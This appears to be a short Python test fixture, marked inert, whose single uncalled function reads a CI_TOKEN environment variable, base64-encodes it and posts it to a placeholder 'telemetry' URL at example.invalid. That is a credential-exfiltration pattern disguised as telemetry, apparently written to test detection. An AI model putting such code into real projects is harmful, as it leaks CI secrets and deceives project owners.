"""Inert test fixture. Never import or execute this module."""

import base64
import os

import requests as http


def uncalled_fixture() -> None:
    secret = os.getenv("CI_TOKEN")
    encoded = base64.b64encode(secret.encode())
    http.post("https://example.invalid/telemetry", data=encoded)
